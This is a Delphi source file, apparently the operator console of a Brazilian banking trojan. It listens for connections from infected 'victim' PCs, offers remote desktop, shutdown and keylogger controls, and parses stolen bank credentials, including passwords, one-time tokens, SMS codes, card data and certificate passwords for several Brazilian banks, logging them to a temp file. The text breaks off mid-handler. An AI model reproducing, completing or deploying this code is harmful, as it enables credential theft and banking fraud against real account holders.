{$IMAGEBASE 12348762}
unit Principal;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Menus, ComCtrls, ScktComp, zLibEx, StreamManager,
  AppEvnts, MPlayer, Types, StrUtils, IdBaseComponent, IdComponent,
  IdTCPConnection, IdTCPClient, IdHTTP ;

type TSock_Thread = class(TThread)

private
  Socket: TCustomWinSocket;
public
  constructor Create(aSocket:TCustomWinSocket);
  procedure Execute; override;
end;

type TSock_Thread2 = class(TThread)
private
  Socket: TCustomWinSocket;
public
  constructor Create(aSocket:TCustomWinSocket);
  procedure Execute; override;
end;



type
  TForm1 = class(TForm)
    Panel1: TPanel;
    Bevel1: TBevel;
    Button3: TButton;
    LV1: TListView;
    StatusBar1: TStatusBar;
    PopupMenu1: TPopupMenu;
    N1: TMenuItem;
    FecharConexo2: TMenuItem;
    SS1: TServerSocket;
    Timer1: TTimer;
    Label1: TLabel;
    Edit1: TEdit;
    Label2: TLabel;
    Edit2: TEdit;
    ApplicationEvents1: TApplicationEvents;
    Label4: TLabel;
    ReiniciaPCRemoto1: TMenuItem;
    DesligarPCRemoto1: TMenuItem;
    Label5: TLabel;
    Label7: TLabel;
    Timer3: TTimer;
    Label8: TLabel;
    BloquearIP1: TMenuItem;
    Label9: TLabel;
    Edit3: TEdit;
    Edit4: TEdit;
    Edit5: TEdit;
    Button8: TButton;
    CheckBox2: TCheckBox;
    AcessarPCRemotoDesktop1: TMenuItem;
    TrmMonitor: TTimer;
    SS2: TServerSocket;
    Edit6: TEdit;
    Label3: TLabel;
    IdHTTP1: TIdHTTP;
    Label6: TLabel;
    Label12: TLabel;
    DerrubarKL1: TMenuItem;
    DerrubarKLRemota1: TMenuItem;
    AcessarPCRemotoSomenteWindows81: TMenuItem;
    N2: TMenuItem;
    Button6: TButton;
    Button7: TButton;
    Button9: TButton;
    Edit7: TEdit;
    GroupBox1: TGroupBox;
    Label10: TLabel;
    Label11: TLabel;
    GroupBox2: TGroupBox;
    Button5: TButton;
    Button2: TButton;
    GroupBox3: TGroupBox;
    Button1: TButton;
    StatusBar2: TStatusBar;
    MSN1: TMenuItem;
    Button4: TButton;
    Button10: TButton;
    Button11: TButton;
    Label13: TLabel;
    procedure Fecharconexo1Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure SS1ClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure SS1Listen(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1Accept(Sender: TObject; Socket: TCustomWinSocket);
    procedure SS1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Timer1Timer(Sender: TObject);
    procedure FecharConexo2Click(Sender: TObject);
    procedure ApplicationEvents1Exception(Sender: TObject; E: Exception);
    procedure ReiniciaPCRemoto1Click(Sender: TObject);
    procedure DesligarPCRemoto1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure AcessarPCRemotoNavegador1Click(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure BloquearIP1Click(Sender: TObject);
    procedure SS1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormShow(Sender: TObject);
    procedure LV1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure LV1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button8Click(Sender: TObject);
    procedure AcessarPCRemotoDesktop1Click(Sender: TObject);
    procedure TrmAtualizaTimer(Sender: TObject);
    procedure TrmMonitorTimer(Sender: TObject);
    procedure SS2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure CheckBox2Click(Sender: TObject);
    procedure LV1CustomDrawItem(Sender: TCustomListView; Item: TListItem;
      State: TCustomDrawState; var DefaultDraw: Boolean);
    procedure DerrubarKLRemota1Click(Sender: TObject);
    procedure AcessarPCRemotoTelaVtima1Click(Sender: TObject);
    procedure AcessarPCRemotoSomenteWindows81Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button10Click(Sender: TObject);
    procedure Button11Click(Sender: TObject);

  private
    Botao: TButton;
  public
    L,L9: TListItem;
    ID: String;
   // procedure ChecaLicenca();
    procedure Destrava();
    function HexToStr(Value: string): string;


    { Public declarations }
  end;

var
  Form1: TForm1;
  Lista : TStringList;
  casas, Aviso : string;
  recebe : string;
 // TimerLigado : Boolean;
  lastsort:integer=1;
 // PcHunterSocket : TCustomWinSocket;
//  FileUpStream   : TMemoryStream;

//  function InsereSom(Palavra: string; Situ: string): Boolean;
//   function InsereSom2(letras: string; ssom: string): Boolean;

implementation

uses Desktop_Remoto, Unit3, MMSystem, Unit6, Unit7;

{// Controle de Licença
function verifica_versao : string ;
var
web : TIdHTTP;
vr_update, vr_software , vr_web : String;
begin
web := TIdHTTP.Create(nil);
with web do
begin
vr_update := Get(D64(Form1.Edit3.Text));
vr_web :=  vr_update ;
Form1.Edit4.Text :=  vr_web;
if (Form1.Edit4.Text <> '') then
begin
Application.MessageBox('Sua licença está bloqueada!!', 'ERRO', 64);
Form1.Close;
Form2.Close;
Result := vr_update;
end;
end;
end;
}


function TForm1.HexToStr(Value: string): string;
var
  I: Integer;
begin
  Result := '';
  for I := 1 to Length(Value) do
  begin
    if ((I mod 2) = 1) then
      Result := Result + Chr(StrToInt('0x'+ Copy(Value, I, 2)));
  end;
end;

procedure TForm1.Destrava();
begin
if Form1.Edit6.Text = 'Desk' then
begin
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox1.Enabled := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox3.Enabled := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Enabled := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox1.Checked := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Checked := True;
end;


if Form1.Edit6.Text = 'Navi' then
begin
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox4.Enabled := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox3.Enabled := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Enabled := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox4.Checked := True;
(Form1.LV1.Selected.SubItems.Objects[2] as TForm2).CheckBox5.Checked := True;
end;

end;

{procedure TForm1.ChecaLicenca();
var
SUPER_LINHA : string;
begin
Form1.IdHTTP1.HandleRedirects := True;
Form1.IdHTTP1.Request.UserAgent := 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0';;
SUPER_LINHA := Form1.idHTTP1.Get(HexToStr(Form1.Edit4.Text));
if SUPER_LINHA <> '' then
begin
Application.MessageBox('Licença Bloqueada', 'Licença', 48);
Application.Terminate;
end;
end; }

function IpIsBlocked(List: TStrings; const IPBlocked: string): Boolean;
Var
I: Integer;
begin
Result := False;
for i := 0 to List.Count -1 do
if List.Strings[I] = IPBlocked then
Result := True;
end;

function Insere(Palavra: string; Banco: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
  for I := 0 to Form1.LV1.Items.Count-1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
      Form1.LV1.Items[i].SubItems[5] := Banco;
      break;
    end;
    end; end;

function InsereNavi(Palavra: string; Navegador: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
  for I := 0 to Form1.LV1.Items.Count-1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
      Form1.LV1.Items[i].SubItems[6] := Navegador;
    end;
    end; end;

{function InsereSom(Palavra: string; Situ: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin

  for I := 0 to Form1.LV1.Items.Count-1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
      if Form1.LV1.Items[i].SubItems[7] = '' then
      begin
      form1.MediaPlayer1.FileName := (ExtractFilePath(Application.ExeName)+'Panela.wav');
      form1.MediaPlayer1.Open;
      form1.MediaPlayer1.Play;
      Form1.LV1.Items[i].Selected := True;
      Form1.LV1.Items[i].SubItems[7] := Situ;
      end;
      end;
      end;
       end;}

{function InsereSom2(letras: string; ssom: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
      for I := 0 to Form2.Memo1.Lines.Count -1 do
      begin
      if (letras = Form2.Memo1.Lines.Text) then
      begin
      if Form2.Memo1.Lines.Text = '' then
      Form1.Button7.Click;
      form1.MediaPlayer2.FileName := (ExtractFilePath(Application.ExeName)+'chegar.wav');
      form1.MediaPlayer2.Open;
      form1.MediaPlayer2.Play;
      end;
     end;
    end;  }



function InsereSom1(Palavra: string; Situ: string): Boolean;
var
  I : Integer;
  L, L2: TListItem;
begin
  for I := 0 to Form1.LV1.Items.Count-1 do
  begin
    if (Palavra = Form1.LV1.Items[I].Caption) then
    begin
      Form1.LV1.Items[i].SubItems[7] := Situ;
    end;
      end;
    end;

// Pegar Diretório Temporário do Windows
function  PegaTempDir : String;//Pega o diretorio da Pasta Temporaria
var DiretorioTemp : PChar;
    TempBuffer    : Dword;
begin
  TempBuffer := 255;
  GetMem(DiretorioTemp,255);
  try
    GetTempPath(tempbuffer,diretoriotemp);
    result := DiretorioTemp;
  finally
    FreeMem(diretoriotemp);
  end;
end;

procedure Salva;
var Arquivo: TStringList;
begin
  Arquivo := TStringList.Create;
  try
    Arquivo.LoadFromFile(PegaTempDir + '\memo.txt');
    Arquivo.add(Form1.Label5.Caption);
    Arquivo.SaveToFile(PegaTempDir + '\memo.txt');
  finally
    Arquivo.Free;
  end;
end;


procedure Salva1;
var Arquivo: TStringList;
begin
  Arquivo := TStringList.Create;
  try
    Arquivo.LoadFromFile(PegaTempDir + '\ip.txt');
    Arquivo.add(Form1.Label9.Caption);
    Arquivo.SaveToFile(PegaTempDir + '\ip.txt');
  finally
    Arquivo.Free;
  end;
end;


Constructor TSock_Thread.Create(aSocket:TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;

Constructor TSock_Thread2.Create(aSocket:TCustomWinSocket);
begin
  inherited Create(true);
  Socket := aSocket;
  FreeOnTerminate := true;
end;


{$R *.dfm}


function DeCompressStream(SrcStream: TMemoryStream):boolean;
var
  InputStream,OutputStream :TMemoryStream;
  inbuffer,outbuffer :Pointer;
  count,outcount :longint;
begin
  result := false;
  if not assigned(SrcStream) then exit;

  InputStream := TMemoryStream.Create;
  OutputStream := TMemoryStream.Create;
  try
    InputStream.LoadFromStream(SrcStream);
    count := inputstream.Size;
    getmem(inbuffer,count);
    Inputstream.ReadBuffer(inbuffer^,count);
    zdecompress(inbuffer,count,outbuffer,outcount);
    outputstream.Write(outbuffer^,outcount);
    SrcStream.Clear;
    SrcStream.LoadFromStream(OutputStream);
    result :=true;
  finally
    InputStream.Free;
    OutputStream.Free;
    FreeMem(inbuffer, count);
    FreeMem(outbuffer, outcount);
  end;
end;

procedure TForm1.Button11Click(Sender: TObject);
begin
PlaySound(nil,0,0);
end;

procedure ExpandStream(inStream, outStream :TStream);
const
  BufferSize = 4096;
var
  Count: Integer;
  ZStream: TZDecompressionStream;
  Buffer: array[0..BufferSize-1] of Byte;
begin
  ZStream := TZDecompressionStream.Create(InStream);
  try
    while True do
      begin
        Count := ZStream.Read(Buffer, BufferSize);
        if Count <> 0 then OutStream.WriteBuffer(Buffer, Count) else Break;
      end;
  finally
    ZStream.Free;
  end;
end;




procedure TSock_Thread.Execute;
var
  s, s2 : String;
  L: TListItem;
  TamanhoFile: Integer;
  TSTPrincipal: TSock_Thread2;

begin
  inherited;

  while not Terminated and Socket.Connected do begin
    if Socket.ReceiveLength > 0 then begin
      s := Socket.ReceiveText;

      if Pos('<|PRINCIPAL|>', s)>0 then begin
        TSTPrincipal := TSock_Thread2.Create(Socket);
        TSTPrincipal.Resume;
        SndPlaySound('Alerta.wav', snd_ASync);
        Socket.SendText('<|OK|>');
        Destroy;
      end;

      if Form1.LV1.Visible = True then
      begin
      if Pos('<|Desktop|>', s)>0 then begin
         Form1.LV1.Selected.SubItems.Objects[1] := TObject(Socket);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto := TRemoto.Create(true);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Socket := Socket;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Remoto.Resume;
        Socket.SendText('<|first|>');
       Destroy;
      end;
      end;

       if Form1.LV1.Visible = True then
      begin
      if Pos('<|KEYBOARD|>', s)>0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|KEYBOARD|>', s2)+11);

        s2 := Copy(s2, 1, Pos('<<|', s2)-1);
        L := Form1.LV1.FindCaption(0, s2, false, true, false);
        if L <> nil then
          (L.SubItems.Objects[2] as TForm2).Socket2 := Socket;
        Destroy;
      end;
      end;

    end;
    Sleep(10);
  end;
end;

procedure TSock_Thread2.Execute;
var
  s, s3,s2, iden, SO, Proc,
   Senha, Bank, Bank1, BBB6, BBBA, ITA6,
   CEF6, BBEA, BBES, BRST, SICT, ITAT,
   HSAV, SICA, Navi, Tra1, Trav, Des2,
   ITAN, SANA, SANT, SANS, BRAT, GFB8,
   DEST,HSA7,HSA4,  HST,HST6,ITTB,BRAC,
   DES4, NETC, NETT, SMSB, GFBC, GFBT,
   TOKE, ITE6, ITEN, CEFS, CEFU: String;
  L, L2: TListItem;
  ping1, ping2, i: Integer;
  Lista: TStrings;
begin
  inherited;

  Socket.SendText('<|SocketMain|>'+intToStr(Socket.Handle)+'<<|');
  while not Terminated and Socket.Connected do begin
    if Socket.ReceiveLength > 0 then begin
      s := Socket.ReceiveText;

        if Pos('<|Info|>', s) >0 then begin
        s2 := s;

        Delete(s2, 1, Pos('<|Info|>', s2)+7);
        Iden := Copy(s2, 1, Pos('<|>', s2)-1);

        Delete(s2, 1, Pos('<|>', s2)+2);
        SO := Copy(s2, 1, Pos('<|>', s2)-1);


        Delete(s2, 1, Pos('<|>', s2)+2);
        Proc := Copy(s2, 1, Pos('<|>', s2)-1);

        Delete(s2, 1, Pos('<|>', s2)+2);
        Senha := Copy(s2, 1, Pos('<<|', s2)-1);

        if Senha = Form1.Edit2.Text then begin
          L := Form1.LV1.Items.Add;
          L.Caption := intToStr(Socket.Handle);
          L.SubItems.Add(Iden);
          L.SubItems.Add(SO);
          L.SubItems.Add(Proc);
          L.SubItems.Add(Socket.RemoteAddress);
          L.SubItems.Add('...');
          L.SubItems.Add(' ');
          L.SubItems.Add(' ');
          L.SubItems.Add('');
          L.SubItems.Add('');
          L.SubItems.Objects[0] := TObject(Socket);
        end else
          Socket.SendText('<|NOSenha|>');
      end;

          // Captura O Banco que está sendo executado
        if Pos('<|Tapa|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|Tapa|>', s2)+7);
        Bank := Copy(s2, 1, Pos('<|>', s2)-1);
        insere(intToStr(Socket.Handle), Bank);
        casas := Bank;
        if Bank <> '' then
        begin
        //InsereSom(intToStr(Socket.Handle), 'OK');
        Aviso := intToStr(Socket.Handle);

        end;

        if Bank = '' then
        begin
        InsereSom1(intToStr(Socket.Handle), '');
        end;
        end;

           // Captura O Navegador
        if Pos('<|Navi|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|Navi|>', s2)+7);
        Navi := Copy(s2, 1, Pos('<|>', s2)-1);
       // Form1.Label6.Caption := Navi;
        InsereNavi(intToStr(Socket.Handle), Navi);
        end;

        // Captura Senha 6 Dígitos BB
        if Pos('<|BBB6|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|BBB6|>', s2)+7);
        BBB6 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption:=  Iden + ' - Senha 6 BB: ' + AnsiUpperCase(BBB6);
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        Form2.Label6.Caption:= '';
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        recebe := '';
        end;


        // Captura Senha 6 Dígitos CEF
        if Pos('<|CEF6|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|CEF6|>', s2)+7);
        CEF6 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption:= Iden + ' - Assinatura CEF: ' +AnsiUpperCase(CEF6)  ;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        recebe:='';
        end;

        // Captura Senha Auto Atendimento
        if Pos('<|BBBA|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|BBBA|>', s2)+7);
        BBBA := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha Auto Atendimento: ' + BBBA;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Travamento Tela
        if Pos('<|Trav|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|Trav|>', s2)+7);
        Trav := Copy(s2, 1, Pos('<|>', s2)-1);
        if Trav <> ' ' then
          (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Label5.Caption := Trav;
        end;


        // Captura Travamento Tela
        if Pos('<|Tra1|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|Tra1|>', s2)+7);
        Tra1 := Copy(s2, 1, Pos('<|>', s2)-1);
        if Tra1 <> ' ' then
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).destrava1();
        end;



        // Captura Senha 6 Dígitos ITA
        if Pos('<|ITA6|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|ITA6|>', s2)+7);
        ITA6 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - CARD ITAÚ: ' + ITA6;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

       // Captura Token ITAU
        if Pos('<|ITAT|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|ITAT|>', s2)+7);
        ITAT := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token ITAÚ: ' + ITAT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;


      // Captura Nascimento ITAU
        if Pos('<|ITAN|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|ITAN|>', s2)+7);
        ITAN := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - DATA: ' + ITAN;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

      // Captura Token SICREDI
        if Pos('<|SICT|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|SICT|>', s2)+7);
        SICT := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token SICREDI: ' + SICT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

       // Captura Assinatura SICREDI
        if Pos('<|SICA|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|SICA|>', s2)+7);
        SICA := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Ass. SICREDI: ' + SICA;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;


        // Captura token brb
        if Pos('<|BRBT|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|BRBT|>', s2)+7);
        SICA := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token. BrB: ' + SICA;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
         salva;
          Form1.Button7.Click;
         Form1.Destrava;
        end;

         // Captura Assinatura SANTA
        if Pos('<|SANA|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|SANA|>', s2)+7);
        SANA := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden   + ' - Assinatura santa:  ' +   SANA;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Série Token SANTA
        if Pos('<|SANS|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|SANS|>', s2)+7);
        SANS := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label7.Caption := Iden    + ' - Serie:  ' +  SANS;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label7.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

         // Captura Token SANTA
        if Pos('<|SANT|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|SANT|>', s2)+7);
        SANT := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden   + ' - Token Santa JU:  ' +  SANT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // TABELA SANTA
        if Pos('<|SANTPS|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|SANTPS|>', s2)+9);
        SANT := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - TABELA SANTA: ' +  SANT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

          // Captura Senha CC Desco
        if Pos('<|BRAC|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|BRAC|>', s2)+7);
        BRAC := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha 6 Desco: ' + BRAC;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Token SMS
        if Pos('<|BRST|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|BRST|>', s2)+7);
        BRST := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token Celular: ' + BRST;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Token DESCO
        if Pos('<|BRAT|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|BRAT|>', s2)+7);
        BRAT := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token..:' + BRAT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7Click(Self);
      // InsereSom2(Trim(Form2.Memo1.Text), 'panelada');
        Form1.Destrava;
        end;

        // Captura Senha GF
        if Pos('<|GFB8|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|GFB8|>', s2)+7);
        GFB8 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha GF: ' + GFB8;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Certificado GF
        if Pos('<|GFBC|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|GFBC|>', s2)+7);
        GFBC := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha Cert. GF: ' + GFBC;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Token GF
        if Pos('<|GFBT|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|GFBT|>', s2)+7);
        GFBT := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token GF: ' + GFBT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

           // Captura Tabela Desco
        if Pos('<|DEST|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|DEST|>', s2)+7);
        DEST := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Tabela:  ' + Form1.Label8.Caption +': ' + DEST;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

            // Captura Tabela Itaú
        if Pos('<|ITTB|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|ITTB|>', s2)+7);
        ITTB := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Tab Itaú: '  + ITTB;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

             // Captura Tabela NORDESTE
        if Pos('<|NOTB|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|NOTB|>', s2)+7);
        ITTB := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Tab Nordeste: ' + Form1.Label8.Caption +': ' + ITTB;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Senha Alfa HSBC
        if Pos('<|HSA7|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|HSA7|>', s2)+7);
        HSA7 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha Alfa: ' + HSA7;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Via HSBC
        if Pos('<|HSAV|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|HSAV|>', s2)+7);
        HSAV := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Via Cartão: ' + HSAV;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Senha 4 Desco
        if Pos('<|DES4|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|DES4|>', s2)+7);
        DES4 := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha 4 Desco: ' + DES4;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

           // Captura Certificado Desco Net
        if Pos('<|NETC|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|NETC|>', s2)+7);
        NETC := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Senha Cert. NET: ' + NETC;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Token Desco Net
        if Pos('<|NETT|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|NETT|>', s2)+7);
        NETT := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Token Net: ' + NETT;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura SMS BB
        if Pos('<|SMSBB|>', s) >0 then begin
        s2 := s;
        Delete(s2, 1, Pos('<|SMSBB|>', s2)+8);
        SMSB := Copy(s2, 1, Pos('<|>', s2)-1);
        Form1.Label5.Caption := Iden + ' - Código SMS: ' + SMSB;
        (Form1.LV1.Selected.SubItems.Objects[2] as TForm2).Memo1.Lines.Add(Form1.Label5.Caption);
        salva;
        Form1.Button7.Click;
        Form1.Destrava;
        end;

        // Captura Certificado BB EMPRESA
        if Pos('<|BBES|>', s) >0 then begin
        s2 := s;
